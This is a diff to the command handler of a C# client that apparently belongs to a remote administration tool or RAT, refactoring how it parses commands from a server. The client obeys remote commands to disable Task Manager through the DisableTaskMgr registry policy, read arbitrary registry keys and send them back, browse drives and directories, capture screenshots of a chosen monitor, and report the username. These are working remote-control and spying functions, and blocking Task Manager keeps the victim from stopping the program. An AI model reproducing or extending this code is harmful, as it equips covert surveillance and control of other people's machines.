@@ -6,57 +6,90 @@ namespace Client.Client
 {
     public class CommandHandler
     {
+        private const string szTaskMgrRegPath = @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
         public static bool SendName()
         {
-            Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes("<CMD=NAME>" + WindowsHelper.GetUsername() + "<EOF>"));
-            return true;
+            return Main.socketClient.SendASCII("<GET-NAME>" + WindowsHelper.GetUsername());
+        }
+
+        public static void SendScreenCount()
+        {
+            Main.socketClient.SendASCII("<GET-SCREENCOUNT>" + WindowsHelper.GetScreenCount().ToString());
+        }
+
+        public static void SendTaskmgrStatus()
+        {
+            string value = WindowsHelper.ReadRegistryKey(szTaskMgrRegPath, "DisableTaskMgr");
+            Main.socketClient.SendASCII("<GET-TASKMGR-REG>" + value);
         }
 
         public static void ParseData(string data)
         {
-            string tempString = data.Replace("<EOF>", "");
+            string szCMD = data.Replace("<EOF>", "");
 
-            if (tempString.StartsWith("<CMD=MSGBOX>"))
+            if (szCMD.StartsWith("<SEND-MSGBOX>"))
             {
-                tempString = tempString.Replace("<CMD=MSGBOX>", "");
-                Main.uiRequests.Request(tempString, RequestUI.RequestType.UI_SHOW_MESSAGEBOX);
+                szCMD = szCMD.Replace("<SEND-MSGBOX>", "");
+                Main.uiRequests.Request(szCMD, RequestUI.RequestType.UI_SHOW_MESSAGEBOX);
             }
-            else if (tempString.StartsWith("<PING>"))
+
+            if (szCMD.StartsWith("<PING>"))
             {
-                Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes(tempString));
+                Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes(szCMD));
             }
-            else if (tempString.StartsWith("<SET-TASKMGR>"))
+            
+            if (szCMD.StartsWith("<SET-TASKMGR>"))
             {
-                string value = tempString.Split(">")[1];
-                const string keyPath = @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
-                WindowsHelper.WriteRegistryKey(keyPath, RegistryValueKind.DWord, "DisableTaskMgr", value, true);
+                string value = szCMD.Split(">")[1];
+                WindowsHelper.WriteRegistryKey(szTaskMgrRegPath, RegistryValueKind.DWord, "DisableTaskMgr", value, true);
             }
-            else if (tempString.StartsWith("<GET-REGKEY>"))
+            
+            if (szCMD.StartsWith("<GET-REGKEY>"))
             {
-                tempString = tempString.Replace("<GET-REGKEY>", "");
-                string[] split = tempString.Split("<SPLIT>");
+                szCMD = szCMD.Replace("<GET-REGKEY>", "");
+                string[] split = szCMD.Split("<SPLIT>");
                 string returnString = WindowsHelper.ReadRegistryKey(split[0], split[1]);
                 Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes("<GET-REGKEY>" + returnString));
             }
-            else if (tempString.StartsWith("<SHUTDOWN-CLIENT>"))
+            
+            if (szCMD.StartsWith("<SHUTDOWN-CLIENT>"))
             {
                 SocketClient.bShouldRun = false;
                 Main.socketClient.GetServerSocket().Disconnect(false);
                 Main.socketClient.GetServerSocket().Close();
                 Application.Exit();
             }
-            if (tempString.StartsWith("<REQUEST-DRIVES>"))
+
+            if (szCMD.StartsWith("<REQUEST-DRIVES>"))
             {
                 FileManager.LoadDrives();
             }
-            if (tempString.StartsWith("<REQUEST-DIRS>"))
+
+            if (szCMD.StartsWith("<REQUEST-DIRS>"))
             {
-                tempString = tempString.Replace("<REQUEST-DIRS>", "");
-                FileManager.LoadDirectories(tempString);
+                szCMD = szCMD.Replace("<REQUEST-DIRS>", "");
+                FileManager.LoadDirectories(szCMD);
             }
-            if(tempString.StartsWith("<PRINTSCREEN>"))
+
+            if(szCMD.StartsWith("<PRINTSCREEN>"))
             {
-                ScreenViewer.TakePrintScreen();
+                szCMD = szCMD.Replace("<PRINTSCREEN>", "");
+                ScreenViewer.TakePrintScreen((int.Parse(szCMD) - 1));
+            }
+
+            if(szCMD.StartsWith("<GET-NAME>"))
+            {
+                SendName();
+            }
+
+            if (szCMD.StartsWith("<GET-SCREENCOUNT>"))
+            {
+                SendScreenCount();
+            }
+
+            if (szCMD.StartsWith("<GET-TASKMGR-REG>"))
+            {
+                SendTaskmgrStatus();
             }
         }
 
